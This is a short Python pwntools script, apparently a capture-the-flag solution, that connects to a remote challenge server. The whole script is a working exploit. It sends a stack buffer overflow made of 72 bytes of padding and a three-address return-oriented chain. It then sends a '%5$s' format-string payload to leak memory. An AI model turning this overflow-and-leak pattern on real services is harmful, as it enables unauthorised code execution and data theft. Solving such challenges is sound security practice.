
from pwn import *

r = remote('gold.b01le.rs', 4008)

r.recv()

p = b'A' * 72
p += p64(0x401216)
p += p64(0x40101a)
p += p64(0x40131F)

r.sendline(p)

r.recvuntil(b'song? ')
r.sendline(f'%5$s'.encode())

print(r.recv())
